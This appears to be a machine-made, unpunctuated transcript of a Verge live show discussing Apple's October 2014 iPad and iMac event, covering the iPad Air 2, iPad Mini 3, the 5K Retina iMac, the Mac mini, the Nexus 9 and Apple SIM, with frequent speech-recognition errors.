the Apple events a little bit after
we're taking it slow and casual much
like the apple event itself to be honest
very low-key kind of doldrum event I'm
here with Chris sigler and top of the
show actually we have dieter bohn from
san Cisco we'll get to in just a second
but real quick um you know get logistic
by the way if you have questions for us
or for dieter hashtag ask verge here's
the news that has happened so far the
big now since iOS 8.1 and OS 10 Yosemite
8.1 will come up monday Yosemite came
out today it is free is also knew I work
ipad air 2 is a it's thinner than a
lasered pencil iPad Mini 3 it's a
complete waste of money we'll talk about
that later iPad Mini 2 plus 1 basically
basically and then a 27-inch imac with
5k retina displays actually really
impressive in priced very well too also
updated mac mini for some reason wish
which tom warren is extremely excited
about I a mystery site again if you have
questions for us report eater has
hashtag ask verge and we'll get them to
us alright let's go ahead and get
started dieter are you there
hey dieter you looking good um hey how's
it going it's doing well it's a couple
questions real quick how was the how was
the ipad event was it as boring for you
as it was for us at home I mean kinda
that we were expecting Apple to go
through their usual run down at these
events they go over you know the latest
OS again on the iphone they go over the
latest OS on the Mac they remind you how
good the iphone sold they they sort of
run through the numbers of all the
features that we kind of had heard about
you know earlier in the year at their
other two events but they did that for
what felt like quite a long time and
then we sort of raced through the new
hardware stuff and it just like it was
exactly what we were expecting nothing
more than that no real surprises except
I suppose the mac mini was neat to see I
might end up buying one but yeah there
wasn't a whole lot of holy crap i would
say the the the best part of the whole
event was stephen colbert doing a cameo
to demo the phone calling feature on the
mac yeah we have a video that won't play
that probably in a little bit afterwards
let's go on top with the products real
quick so the ipad air 2 with the laser
shared intro did you get chance to play
with that at all after the event yeah
yeah i did just a little bit and you
know what it's an ipad it's stupid thin
it feels pretty light the screen is very
pretty it's fast I mean that I hate to
say it but like it's kind of boring but
this has been the knock against Apple
products for a long time they seem kind
of boring but they're great the one
thing I'm most curious about with the
the new iPad air is the anti-reflective
coating you know I didn't get enough
time with it to really see how I feel
about it but you know I've got lamps in
my house that's a thing that people have
and like using the iPad lights behind
you can be a pain and so I'm really
hoping that it'll be it'll be nicer so
we'll see but yeah I mean of the the
stuff that was announced today I think
that the coolest thing was obviously the
new iMac
and then the number two thing is the the
ipad air 2 and then from there you just
can kind of forget about the rest of it
so let's talk briefly about or maybe a
length about via the imac because i
agree with you i think that was the most
interesting announcement in the most
exciting i'm assuming you've seen the
display is it as insane as it sounds it
is even more insane than it sounds it is
just stupidly good-looking it has
incredibly good viewing angles you know
just they're playing growth video
editing software obviously to show it
off I didn't see any lag but of course
this is a demo unit so it's ideal
conditions the way that they've got it
all set up but I you sort of run out of
things to say about a screen when you
look at it it's like there's no pixels
that you can see it is gorgeous it is
bright it has incredibly saturated rich
colors if there's a better screen
available for a regular human to go out
and buy today to look at things on I've
not seen it right and what about the
screen legs you notice anything I need
to talk about this time and controller a
little bit too yeah I mean they they
they Apple's very excited they brought
it up two or three times they made this
custom chip to control the pixels sure I
mean I I'm sure that it's important I
mean I didn't detect any lag but again
it was a pretty controlled demo so it's
really hard to say you know if it will
actually do it I know it was an issue
with the you know the first retina Mac
so there was some concern that they
weren't powerful enough to keep up with
it but you know this is a big ass
desktop and so they've got you know
plenty of stuff that they could pack
into it they don't have to worry as much
about heat apple claims it's even more
energy efficient than before two so
presumably that helps with heat as well
so I don't think that we're going to see
the same sort of early issues that we
saw with the original retina max on this
imac I think it's just it's just going
to be good I think one thing that's
really surprising about this this imac
is the pricing i think you expressed a
little bit of surprise in the live blog
and i was my job momentarily dropped as
well and so i guess
my question is what does this mean for
the mac pro I mean I guess there's
probably still market for it but it
certainly seems like this steps on it a
little bit particularly considering how
much time they spend talking about video
editing with this announced and and also
what the heck a 5k display I would
expect to spend twenty five hundred
dollars just on a 5k display much less
an entire imac with a you know a 339
gigahertz was i5 or i7 and I'm you know
one terabyte fusion drive all this stuff
so it would talk a little bit about the
price was that was that a shock for you
yeah it was I mean I gotta be honest I'm
not I haven't been shopping for 4k
displays or TVs or moderate or anything
else so I'm not super conversent in that
but I was fully anticipating this thing
was going to be over $3,000 so I was
pretty shocked that they were able to
get it in at 2,500 you know if I if I
owned a mac pro right now the one thing
I'm wondering is how can I make this
thing my monitor for my mac pro and why
can they make one that doesn't have the
whole computer in it to bring the price
down even further I bet not at least not
for a while yeah i mean the the big
question with any desktop computer is
justify your existence convinced me to
buy you instead of a laptop and with the
mac pro it's easy it's like this is a
super pro grade machine to do super pro
grade stuff and with an imac you know
it's not going to be as powerful as a
mac pro so they've got to do something
and so it's either got to be super cheap
or amazing in some other way and Apple
kind of managed to do both it's not
ridiculously cheap but to get this
display for this much money I certainly
wasn't expecting it and you have to
wonder you know apples famous for having
really high profit margins you kind of
have to wonder if they're getting that
on this computer so let's talk about a
ipad for a second because this is the
first one that's available in gold have
you seen a gold one is it as ridiculous
as it sounds
it's muted it's not like look at me I'm
gold in the way that the iphone 6 plus
is so it's not so bad it's not so
ridiculous I would almost say it feels
more bronzy than gold I mean I'm a guy
that used to own an orange iphone so I'm
really not one to talk but it doesn't
look too ostentatious and ridiculous to
me so to be clear this is a different
shade of gold than the iphone 6 and 6
plus it seemed like it to me but I mean
it could be that just at that size it it
looks a little bit different but I mean
I was expecting to look at this thing
and have to shield my eyes and and just
find it to be the most ostentatious
ostentatious device ever created by
human hands and it also didn't look like
that I mean I still would be getting a
space gray one you know actually
honestly if we're talking about iPads I
I did the hands-on with the the iPad
Mini 3 4 for the website and I've been
waiting to talk about it because of
everything that happened today it is by
far the most disappointing it's
basically an ipad mini with retina AKA
ipad mini 2 and they threw touch ID on
it for a hundred that's it yeah like it
didn't even get stage time yeah they
they just like Schiller's like oh yeah
by the way we did the thing with the
retina on the mini it's like it's got
touch ID now see ya it's like oh but
that was the one I was gonna buy no it's
ya know it's embarrassing but we talked
to us in our era news but they also now
have one yeah let's say that's it again
I'll just go on sorry about that i was
going to say they also seem to have 15
different ipad models in their lineup
now you get the original ipad mini you
get the ipad mini 2 you get the ipad
mini three you get the ipad air and you
can get the ipad air 2 i miss any is
that everything it's just five I think
that's everything although it does seem
like the ipad mini 2 is going away
because like i said it's a hundred
dollars for touch ID and gold everything
else we look at the spec comparison
before we went on the air everything
else is the exact same which is almost
like ipad mini to get it now because
it's a good deal while supplies last
because pretty soon that price
looks like no wonder they didn't spend
any time talking about the mini 3 and
it's it's not a good deal you're like
Peter mentioned you're paying a hundred
dollars for basically touch ID and and
it's seemingly nothing else it looks
better though if there is no ipad mini 2
on the market which i feel like in a
couple months time after christmas that
stock is just going to dwindle i don't
know if that's true i mean we'll see but
but typically apples strategy has been
to keep the old models in the lineup for
a full product cycle but we'll see I
mean look at 5c to like the iphone 4s
stuck around longer that might be the
ipad mini one because oh you get the
cheapest ipad / 250 bucks that's a great
rounding pitch right so dieter let me
ask you a lot a lot of time talking
about taking pictures on tablets which
seems to be a an admission by Apple that
this is a thing and it's not going
anywhere so we might as well make it a
really good experience what was your
what's your reaction well hang on hang
on hang on hang on why are you calling
in an admission an admission implies
that there's something wrong taking
pictures with your tablet is cool bro
it's awesome thing to do I just like
look like they're there situations where
it's not okay to take a picture with a
tablet if you're at a concert don't be
that person otherwise you know what
don't judge it's cool it's a big screen
and at least with the ipad air it seems
to have just a really good camera they
took a whole bunch of the stuff that
they created for the iphone 6 in terms
of like software features and applied it
to the ipad air it doesn't they didn't
get into enough detail to say whether or
not it's the exact same sensor and the
exact same optics as the iphone 6 i'm
sure it's not because it just doesn't
look like there's space for it but yeah
if you've got a really good camera on an
ipad then you know use it i will say
that the one sort of admission thing
they did do is they went right from like
you can take pictures of it aren't these
cool pictures to talking about like wild
and crazy apps that you can use on an
ipad that kind of makes sense with the
camera they had the thing where you know
they show like a baseball guy swinging
and like you can like analyze the
accuracy or the behavior of a swing that
was kind of neat
but really you know at the end of the
day like there's nothing other than even
the touch ID was not the thing there's
nothing with either of these that makes
you go holy crap this is a brand new
thing that I was not expecting that is
going to change things yes they made it
crazy thin they shave the pencil with
the laser but other than that I mean
it's an iPad it's a really good tablet
it's probably the best tablet and it's
better than last year and we just keep
on marching on I was hoping to see more
I mean they even said on stage I think
with Schiller said each one of our
products in our lineup pushes the other
products to be better so the iphone
pushes the ipad into needing to be more
professional if you're going to make
that claim I think you need to finish it
you need to finish it by showing us
maybe that split screen stuff that's
been rumored for so long I was really
hoping we'd see an ipad air demo that
showed some real multitasking but we
didn't most of the software story was
stuff that they had already talked about
in you know earlier in the year yeah it
actually seems to me like maybe they
sandbagged just a little bit to pump up
an event early to mid 2015 that'll
involve of course the Apple watch maybe
some sort of ipad pro which has been
rumored for it like 20 years it feels
like and of course the the retina
MacBook Air yeah I mean I'm waiting for
that retina MacBook Air you know people
were hoping it'd show up at this event
I'm totally fine with it not showing up
this event if the chips aren't ready if
the thing is it ready just wait because
it's computer that every single human on
the planet is waiting to buy and they've
got to get it right so if it's not ready
yet I'm totally fine waiting it's funny
how much the the Apple watch came up I
mean they needed to tease it here and
there I think the only real use we saw
with it was they showed off it was a
preg trigger ed showed like using it as
a remote to go through his presentation
but it wasn't clear to me if he was
tapping the screen or twisting the
digital crown but they look fine they
look they look good on executives were
so they would flash it so early 2015 it
didn't move up well we'll see him next
year
great dieter we gotta let you go into
the second but final thoughts what was
any other final thoughts on the event
itself just overall it ran through fast
it felt almost a little Samsung and how
quickly they ran through features and
we're willing to just jam through tech
specs which was not something I expected
from Apple but really like the takeaway
for the day is get to an apple store and
look at the display on this imac because
it's just crazy awesome well dieter
thank you so much thanks guys all right
let me to get back and grab coffee and
all that we do actually have first
footage of the ipad hands-on take a look
at that and we'll come back we'll answer
some of your questions from a scourge
hey guys the average I'm here with the
new iPad air 2 which is really really
thin I've got my old iPad air here you
can see how much thinner this guy is
just it's incredibly thin one notable
change is there's no more side switch
here it's gone but here it is it's
really thin it's got touch ID sensor on
the front inside its got a new ax
processor and the screen actually is
laminated now the first time an iPad the
screens in laminated which is just like
the iphone and the iphone 6 plus and it
looks really really incredible it's like
you're touching and pixel is exactly in
the display which is a big change the
iPads may have been wanting for a long
time there's also Apple pay support but
there's no NFC so it's all happening to
touch ID sensor now wave it if they use
you can't wave a knife in that it's a
that other big change to bat the camera
is new to eat megapixel iSight camera
Apple's really high in it they spent a
lot of time talking about this new
camera here to trust a picture with it I
think tablet photography has really
arrived it took a picture of land co and
off there is with handsome this is I
think a big deal i think i've had
photography and the apps that make use
of a good camera on a big screen are
actually coming up and changing so that
is in the ipad air 2 and here is the
iPad Mini 3 this is the updated ipad
mini it has the a7 processor it has new
finishes it comes from gold now the
major change here is really the touch ID
sensor on the front this play is still
not optically bonded but it is a really
nice-looking iPad I just do this fall in
a second as you can see here the iPad
Mini 3 still kind of notably thicker
than the new iPad air 2 so between the
two and the iphone 6 plus you actually
have a huge collection of screen sizes
or iOS now I think the air to is really
nice product the screen laminated is a
big improvement over the original air
and it is just so much thinner it is
actually kind of impossible to parently
what I love the most about that video is
like Neil I just grabbing it you know
there was another journalist out there
probably taking pictures or doing their
own hands on video ya know like I'm
sorry I hope it was Joanna Joanna stern
formerly of the verge now we're really
over a wall see journal great so we're
going to take a few questions a hashtag
ask average I'm just running through
this real quick if you have any other
questions keep updating and I'll keep
just looking down I promise I'm looking
at you and everything you're asking us
and nothing else let's go through real
quick I was gonna hear anything about
any macbook updates at all look I said
maybe just spring hopefully yeah ipad
mini 2 vs 3 we talked about a little bit
dieter let's just kind of rehash that
just a hair the only difference is we
can tell we've looked at the apples
official spec sheet the only differences
are once available and gold one has
touch ID and one cause one hundred
dollars more and that's basically all
the iPad Mini 3 if you can get the ipad
mini tune you do not care about touch ID
and you do not care about gold that's
probably the better deal yeah I think I
think that
that what we mentioned this when we were
talking with dieter the it you know
paying a hundred dollars for for touch
ID seems completely insane and if you if
you have a mini to I don't think that
there's any reason that you would want
to consider mini three even if you have
a mini or no mini at all I'm not sure
that the mini three makes the most sense
because sure touch ID is nice but is it
something that that you want to spend a
hundred dollars on protein and probably
not so unless you either desperately
needed gold mini you desperately need a
touch ID or you just like throwing money
everywhere for a giant corporations mini
2 seems like the best deal it does and
then we should also get into this
another question of missing a lot what's
up with the iPod the iPod Touch
specifically the 16 gigabyte ipod touch
right now is $109 the cheapest 7.9 inch
mac mini is now two hundred and forty
nine dollars i like right now the ipod
touch is still on sale but I'm kind of
wondering how long that's going to be as
well you so your hypothesis is that
they're just going to kill that pod
touch I mean they just killed the ipod
and yeah but it for a long time I like
updated the shuffle or the name which
are great like utilitarian devices I'm
sure they still sell decently but those
numbers that on the decline for so long
I think they're very polarizing products
because you know different people have
very different opinions about what's
going to happen with these lines date if
you talk to David Pierce he'll tell you
that that the ipod touch is a gateway
drug into iOS and it's also I mean it's
a very good point that it's something
that you give your kids right and I can
give your child you know your
six-year-old child a 6 plus maybe well I
don't know but uh but it's a lot more
cost effective and potentially less
expensive to give them something a month
the month that is to give them something
that doesn't have a cellular connection
ipod touches is old it's a lot cheaper
than a six so and and you're sharing the
same apps obviously with your phones so
right but you're also showing the same
maps with the ipad which can upscale and
the difference is not only fifty bucks
and that's also requiring extra apple to
continue support the lower resolution
which or the lower size screen which
they're doing right now with obviously
the
legacy iPhones right I just I don't know
how long that's they're going to care to
do that once the 4s is completely out of
the cycle and I guess or the five yes
Laila cycle that's true i mean let's put
it this way if they could find a way
long term to deliver say a 99 100 $29
ipod touch with the current specs or
maybe even slightly warmed over specs I
think that's a product that they can and
would want to leave in the lineup for a
very long time to come because the the
entry point into iOS then becomes very
very low it that's not to say that that
it can't be low as it is you have
products like you mentioned the 5c which
is zero on contract you you have
products like the the original iPad Mini
but still if you could if you could hit
sub hundred dollars with with an ipod
touch that would be a really compelling
proposition there a lot of people who
want access to the app store on a knife
I think on an iPhone form factor but
don't necessarily need a cellular
connection so really you can think of it
as like the smallest iPad at that point
really good the ipad nano back the ipad
danna that's right um a couple of
question which to run through and i can
talk about the the tone of the event as
a whole uh mac mini extra shot with that
later cuz i'm really excited about that
uh should we get should you actually
download OS 10 using me on day one we
actually just published a review of OS
in yosemite we done and it looks pretty
solid but more or less we find a
birthday yeah David told me in the
process of reviewing it that he was hard
pressed to find bugs that said that said
I have never personally been a day one
downloader I'm not going to be a day one
downloaded this time is the person that
buys the phone on day one harder is
different well you know I rely pretty
heavily on creative cloud for instance
and adobe is infamous for having
compatibility issues new versions of OS
10 right I just want to give it a few
days let other people be the guinea pigs
and then we'll see what happens but now
you just yet I'm a strong believer that
OS 10 Pete with snow leopard I'll go to
my grave saying that
um but yeah a pre eventually okay I I
what you are gonna be a day when
downloaded that weary yeah hundred
percent I do not care about whatever
little nagging issues are gonna be there
like it's still overall a better product
great so I live on the air man just as
does you have to do funny it's live
television who cares i'm doing it right
now on but the last question they were
probably take we're going to move on is
there anything surprise you at this
event uh to me it's just the amount of
dad jokes in weird goofiness of the
secrecy yeah it was a it's a new apple
right like i think that every event that
federighi is and i get more and more
surprised at what a huge effect he has
on the tone of the event I think back to
WWDC with the OS 10 weed jokes Air Force
Air Force One he's he's definitely a
light-hearted character in their
executive mix and I think that is a good
look for them the problem the only
problem is that they leaned they had to
lean way too heavily on him to make dad
joke this is a Eddy Cue and I don't even
know who doing the secret handshake and
failing the most ill-advised yeah and
then he gets kicked out of the building
um yeah no I think that it's it's fine
it's all well and good that they do that
sort of stuff but they just need to not
do it as much they had lieen really
heavily on him here because they didn't
have lots to talk about right and they
there's probably a lot of you know there
are many minutes that they could have
trimmed out at this event if they'd
wanted to I know agreeing to the terms
conditions this is happening folks right
now you you are really gonna regret but
they're also the talk of like not just
double it down Lee crossed out its
triple downing on secrecy if they're
like just a wink and nod the fact that
everything is kind of leaked it was
already like a kind of pretty low key
event as self yeah I mean it yeah can
you imagine that happening in the jobs
here I certainly can't you know I might
not imagine them letting anyone like
that number executives developers on
stage that we're like pristine
in eloquent as all out because right
anyone who fumbles with their words a
lot of people did fumble with a Q cut
with the Q's today uh it would probably
been fired me on the jobs are it's a
nice trick too rigid yeah it's it was
very interesting to see the way that
they treated even last night when the
when the 8.1 user guide leaked with the
the new iPads in it I think that yeah I
expected Apple to just freaked out and
certainly not acknowledge it on stage
and instead they joked about it for like
20 minutes and they brought in uh chief
of secrecy or now Supreme Commander
secrecy Stephen Colbert Stephen Colbert
ass she would just watch that clip real
quick I just wanted I just want to show
everyone else what that was like to see
in the live stream and so next I'm going
to move on to the next slide in my
presentation and you know I heard that
our new chief of secrecy Stephen Colbert
has some concerns about his part of the
presentation and so actually I can give
him a call from my mac right here at his
office so let's just type up Stephen
there's this work number and I can just
dial right here and it's going to die up
my max gonna actually make a speaker
phone call through my phone and by the
way yeah I have the coolest job in the
world I get to talk to Stephen Colbert
hello uh hi Steven it's craig from apple
i'm sorry i don't recognize that name oh
oh right hello red delicious this is
granny smith / is the squirrel in the
basket Roger Foxtrot Thunderbolt retina
swift lightning okay their line is
secure magical
I have some very critical feedback on
the content of your presentation today
specifically I've got a big problem with
my title well a chief secrecy officer
that's a pretty impressive title I just
don't think it's big enough to capture
how important my role is and have let me
run this one by you hear me out supreme
Allied commander of super secrecy I
don't know Craig if supreme Allied
commander was good enough for Ike it's
good enough for me ok it beat Hitler we
also accept intergalactic Chancellor
intergalactic Chancellor how about
Supreme Commander you let him know I uh
who I'm sorry I mean chairman honeycrisp
oh yes yes
yes absolutely i don't like I don't let
the Chairman know you see things my way
now please get back to work because you
know what I see when I look at my wrist
my wrist chop-chop I'm jonesing from
some jewelry quick I'll get right on it
Steven all right over now granny smith
over and out red delicious he's jonesing
for some jewelry his Jones modular we
actually did get asked what watches were
wearing and this is a busted seven
dollar novelty gift with the golden eye
pause screen you realize that you can
get that of course you do you can get
that Vette watch face on a moto 360 I
also realize i can save through dollars
and get a nice dinner and some drinks
and go on vacation that's fair just why
I have not upgraded my iphone yet either
I like to enjoy having money I'm wearing
my favorite g-shock I'm a bit of a
g-shock beast Sam is going to kill me
for for admitting that Sam is not a
g-shock fan but until right now I'm on
an iphone six-plus so I can't use my
moto 360 so I'm kind of is the question
is do I get a pebble I kind of like the
blue there's a there's a pebble that's
kind of a similar color to this or do I
just wait for the up a watch or do I
just give up on smartwatches completely
well if I don't spend money on iphone 6
plus a piano dollars try the pebble you
can try the one that I stole from dan
I'm not using it anymore did you mug him
I didn't I asked nicely I say you just
care it yeah okay we start I won't have
a l'ecole birthing because that is the
only time on Apple stage that Hitler has
been mentioned in any way shape or form
are you sure have you gone back for all
the events I'm just gonna take a wild
guess and say no has ever mentioned
Hitler on an apple so I was I was just
thinking while we were watching that
this is now at least the second time and
I'm assuming more than that I'm just not
remembering correctly that they've
prominently featured and spoken to one
or more celebrities right during the
event and it seems like maybe that's you
know for a very long time Apple has
involved music popular musicians and
musical groups in in their events and
now it seems like maybe they
are there moving to celebrities like in
television movie slippery yeah I mean
it's simply that broad appeal and we
talked about that when the Apple watch
that came out and like the fact that
they're giving interviews to Vanity Fair
to vote until his places like the idea
now is like they want Apple to be a
fashion brand and to be a fashion
mainstream brand need to bring in
celebrities and people who are
influential in those circles that is
your talk show host for your future CBS
late-night talk show host that is the
foo fighters who are still relevant that
is Coldplay who is consciously uncoupled
itself from reality or that's that's you
too I'm sorry uh speaking of fashion and
celebrities I was thinking on know where
the segways I just I just want to bounce
something off again I was thinking I
during the event what if Apple did an
ipad edition or an imac edition like
they're doing an apple watch edition
that is 18 karat gold 18 karat gold iMac
and 1800 maybe nine imac cuz that but
shy it's a lot of gold right there but
certainly I mean someone will buy it uh
but but certainly uh an ipad edition I
think would play well I think it would
play well in certain circles people who
have more money than either of us will
ever imagine but again it's a fashion
brand I think the interesting part of
that if we're gonna go back to the last
month's event is the how long do Apple
watches stick around iPads you know you
upgrade once or twice a year they keep
it very similar the iphone cycle i have
phone cycle yeah but these so via i
think that although Apple does upgrade
its iPads annually miss of course we saw
that again here today that that doesn't
support itself in the same way that the
iphone upgrade cycle does which is very
reliable every year you have you know a
very significant percentage of iphone
users upgrading to the next iphone some
viet we i'm sure that other other groups
use this this vocabulary as well but we
say the people on the s track if like
they're only upgrading every other year
on the quitting ross miller here with
the ipad i think it's just like well i
have an ipad it works fine i'm going to
upgrade when it breaks right i know i
know lots of people that still have an
ipad 2 so I i think that the product
cycles and the the life cycles for the
devices is that is actually very
different from category to category lots
of unanswered questions about the watch
we don't know if they're going to
attempt upgraded annually we don't know
what they're going to do when they do
upgrade it because you're sitting there
with a chunk of actual 18 carat gold in
your hand or whatever the material may
be right so that's yeah that's
definitely an open question my question
is well one of my many questions is what
did they do with the ipad mini next year
because i think one of the reasons that
it was downplayed so have we haven't
talked about this yet i wanted to get
into it one of the reasons that the ipad
mini was so heavily downplayed this year
is because the six plus encroaches on
its territory and certainly for we this
is something that we've heard many times
and i believe it's true if you if you
bought a six plus or if you're going to
buy a six plus and you also want an ipad
that I you're certain you're almost
certainly not going to buy the ipad mini
because it's so close to a 6 plus you'll
probably get the big ipad well it's even
it's less powerful than 6 plus now too
because it's still last year's processor
yeah that's a very good point so the
question becomes do they do a more
significant refresh of the many next
year or do they just kind of
semi-permanently downplay the
significance of the mini and light of
the very large phones that they're now
making I I don't know I don't know the
answer yeah I think that we should also
talk about the naughty Elf in the room
but something that we should talk is
kind of hangs over yesterday course
Google announced android 5.0 I pop it is
a lollipop it is lovely proud lava cake
or what are the bases in there I just
guessing Liam Gallagher but that didn't
happen either wow I do I'm still bummed
about oasis yeah 50 ages later when I
bet I can't they're going up yeah but
with that of course new flagship
products the HTC made Nexus 9 same
resolution as the ipad air but 8.9 inch
4 by 3 ratio same also pre-orders start
tomorrow with that because 64 bit
processor first for a nexus tablet to
expand nine hour battery life is the tin
on the ipad air and it starts at four
hundred dollars for 16 gigs so it's it's
priced very competitive with the ipad
air yet it's I think that Google
definitely looks at this
premium product it's the first time
they've gone to HTC for a Nexus device
in quite some time and and i think it's
it's super notable that they're going to
four by three with this tablet instead
of sixteen by nine or some other aspect
ratio it's pretty clear to me that they
want this to be a direct competitor to
the ipad line it's it's kind of neither
a mini nor an error in terms of size but
but it falls somewhere in between and i
think that it's gonna it's going to sell
very well because it's it's it's that
it's the right aspect ratio and and it's
it's a good looking product that's
really good price for it too yeah but so
does this affect the the sort of balance
of power between Apple and Google in the
tablet space uh I it depends largely on
how this is marketed right if we see
this in stores everywhere if we see big
kiosks for it I think they can make it
dint you look at the Nexus 7 and sold
very well right then the next is in fact
there was a time when we said that the
nexus 7 was the only android tablet that
mattered and i think that the next 9
could be the new that right i mean then
8.9 inches i mean that's a perfectly
sized like it's the ipad make better
with the right specs the right price
yeah um you know I a lot of Alaskans
compared to to the problem but that is
we know what the ipad air's like we
tried today we haven't tried five point
over the Nexus 9 we even tried Nexus 9
we haven't tried a final version of
Android 5 we haven't we haven't touched
a nexus 9 lots of unanswered questions
but but I have a strong feeling they're
going to be answered very soon yeah and
I promise when we know what the Nexus 9
is like we will tell you and we will
draw comparisons of course between the
two because they are as you are going on
sale both going on pre-orders tomorrow
you know that's the the if then if not
that yes question yeah we're definitely
not going to keep those impressions to
ourselves we're going to put those on
the website not one bit and I guess we
should probably get abs we're sort of
wrap around the wrap up what is also
wrap around 40 start a wrap around just
like this not allowing wrap up the imac
minus the Brenda display yep that's the
big question that's actually probably
most exciting and
today and you talked about the price the
the mac mini was mostly no I'm kidding
the mac mini was a participating
announcement yeah I look I twenty five
hundred dollars is a lot to spend on a
computer for anybody but if you're going
to spend twenty five hundred dollars on
a desktop I can't imagine not seriously
considering this thing right right it's
it's the total package and ever since
they did the last round of redesigns on
the imac and made them super thin it's a
beautiful all-in-one it's just it's it's
a really striking device and with this
display I mean it's it's insane the fact
one thing that they said a couple times
on stage which i think is just crazy to
think about is the fact that you can
edit a 4k video pixel for pixel and
still have room for the UI of the video
editor around it which is just it's well
I mean I'm curious about that allegation
because it's it's 5k retina but if you
know like your retina MacBook you're not
actually getting 5k or not you're
getting the full render display you're
getting fine-tuned pixels and like a
2500 by 1600 like sometimes they'll
actually just like make it a crisper
display using the extra pixel space so
I'm curious what is realistically how
they were going to use that screen yeah
yeah points versus pixel sorry John is
in my ear correcting all my techno
babble thank you I'm sure that that our
I have to believe that our video team is
kind of frothing at the mouth over this
5k display but maybe I'm wrong maybe
they think it's a piece of garbage well
to have a serious conversation with I
about this device afterwards we actually
we have hands-on with the imac retina so
people have actually seen it can talk
about it Jeff lather so let's take a
look at that you guys this is David for
virgin and this is the new Retina imac
it's an imac with a Retina display has
the same body as always it's still super
thin but it has this brand-new 5120 by
2880 display that's exactly double the
resolution of the last time and there's
a whole bunch of new technology in here
to support it there's a new timing
controller which tells the pixels when
the move and where there's all kinds of
stuff going on here Apple basically had
to rebuild the display they say it's the
world
highest resolution display and honestly
I have no reason not to believe that
this way looks amazing like in the you
see every detail of Paris and the Eiffel
Tower and everything looks amazing it's
designed for photographers and people
who work with 4k video and it really is
just gorgeous and it's also still thin
and light and really nice the display is
the hero here it's two thousand four
hundred ninety nine dollars to start
with a 3.5 gigahertz core i5 processor
you can spec it up and get a 3 terabyte
hard drive and 4 gigahertz core i7
processor you can you're really crazy
with this thing but this is very much
the top-of-the-line imac it's really
beautiful you'll really have to see the
screen to believe it for most people it
might be overkill but it's really really
really nice this is the new imac with
retina display is out right now and it's
probably the best computer screen i've
ever seen ok we actually wanted to talk
about the imac retina but we just saw
this while the vids going on Apple is
actually including its own sim card one
sim many options so if you get a
cellular iPad you can just change the
carrot on the fly it seems this is
something that where I am and I'm sorry
this is happening in real a little
reading about it as we speak but this is
something that we we have known that
Apple's wanted to do for some time move
to an embedded sim this goes back to the
Steve Jobs days I think there were
rumors that he he personally thought
that that Sims were onerous and terrible
needed to go away and of course they
Apple was a major force in getting the
the so called for FF that the nano SIM
pushed through the standards process and
approved they keep trying to make this
am smaller and with the eventual goal of
making them go away and it looks like
they have now achieved that Alma with
the ipad air 2 yeah they're they're
they're definitely moving in that
direction here single sim can be as as
Ross mentioned can be reprogrammed
depending on the the carrier that you're
taking the iPad to what the practical
benefit of this to the end user is
really pretty small I've never
personally considered the sim to be
that annoying you just pop it out you
pop a new one in the most annoying thing
about it is something that Apple
actually pioneered which is the sim tool
would be the tray yeah used to be that
you just pop the battery cover off
something with this imminent take the
same amount bullets amount but also now
they don't have to even create that
functionality so you can make it a
thinner device the les portes it has to
have right the interesting thing is and
this is actually on their official site
when you look at the ipad air 2 stuff
there's one sim description it shows in
the picture 18 T it shows t-mobile show
sprint verizon not listed I don't know
if like that's still a separate device
all together I can't imagine but that is
interesting it isn't certainly isn't a
cdma thing because spring is in that
list right yeah I don't know but it's uh
that's that's unusual and it's um it's
also unusual that this is something
they're introducing on the the ipad not
the iphone then again correct me if i'm
wrong Ross because you're in a walking
encyclopedia you know all things a pop I
believe this is not I believe that the
ipad is where the mini sim first debut
the original ipad i want to say was the
worst production device to have a three
FF mini sim and then the iphone 5 i
believe was the first production device
dev of 4 FF nano-sim so that they have
pioneered some sim technologies on the
ipad before and it looks like they're
doing so again here if you look at it
selling apples paid ipad air 2 /
wireless all that participants or ATT
Sprint t-mobile and course EE in the UK
Everything Everywhere which is my
favorite name for a company ever right
um with of course the sub notes
participating carriers are subject to
change so yeah they must have worked the
only way they could have done this is by
working with carriers to commit to make
this happen and a you know i have to say
i have to give Apple tons of credit
regardless of whether you like apple or
not like the the amount of control that
they wielded over carriers which are
notoriously hard to work with is amazing
to this day they are basically the only
sure that is allowed to roll out
firmware updates willy-nilly without
carrier approval usually that works out
very well sometimes it doesn't like with
a point 0 point one but but this is this
is indeed very interesting and something
that will be doing some more research on
we should go back to the imac yeah
goodbye to that Mac now this tangents
over yeah the so we saw David's hands on
and by all appearances from everything
we've heard from both David and also
from dieter the display is miraculously
good right is a question whether you
want to spend $25 on it or you could get
two thousand dollars on a 4k TV videos
big uh push was a nine dollar 4k and get
a new mac mini which I'm not kidding I'm
actually kind of excited about yeah note
I mean Tom Warren squealed with glee at
the mac mini announced I didn't know he
was such a big mac mini fan but
apparently he is I'm assuming that he's
planning on installing windows 8 on it
it just makes a really good like just
like home PC like I just something can
cook up to your big TV and run plex on
it run all your video apps because I
think we just added a total and I said
Chris planted in tutorial on this that
really is sometimes the best interface
and like the most options come from just
a web browser hooked up to your big TV
yeah that's true that's true yeah that
was actually really popular pizza
version I knew all that it's still
cheaper it's got a bigger screen too
yeah I can't consider that that's that's
a very good point you don't get the I
mean there's something really sexy and
appealing about just having a single
device that you pull out of a box and
set down and it's a 5k display with all
these really amazing hardware components
built in but there is also something to
be said for saving a thousand dollars
yes I just buys a 6 plus off contract
look and will not upgrade the software
look look I'm just saying um so the base
mac mini starts at four ninety-nine is
that right but although like yeah this
is a fair comparison imac it's just 1.4
gigahertz intel core i5 dual-core it's
like comparably to the specs the imac
with retina is way better way more
powerful i mean it's right definitely at
some point you
can see this blurring the line with the
mac pro because we do not have and this
insane people gasp before we do not have
a new cinema display I think yeah i
think someone pointed out i just went
out it's been 1,000 127 days since the
cinema display was last updated Thank
You agent pollito for that that's Chris
accurate that's insane I bet that they
could have and would have shown a 5k
cinema display today except that they
didn't want to take the wind out of the
sails of the imac launch that's my guess
I I'm assuming that in 2015 WWDC we
actually be a great place to date to
debut it which is where they debut the
mac pro two I believe yeah you might be
right the model is Lisa form factor they
all blur together how's the events / I
but that would have been or that would
be a great place in 2015 to show a 5k
cinema display we one thing that I want
to point out going back to the the list
of available mac minis the 699 model
which comes with a 2.6 gigahertz
dual-core i5 8 gig of memory and a one
terabyte hard drive very interesting the
2500 dollar retina imac has eight gig of
memory and a one terabyte hard drive
really yeah so that's that's pretty
striking to go up by almost two thousand
dollars in price well you not get more
memory your heart you're also talking
about 3.5 acres quad core processor so
we're talking a lot more vessel and a
dedicated graphics card where's the mac
mini i'm assuming at intel iris graphics
this is integrated graphics chip yeah
sure i'm just saying that it seems like
in 24 in late 2014 16 gigs should be the
standard ram level for what is by all
standards a high-end desktop so that was
a little surprising to me and I think
that dieter actually showed some
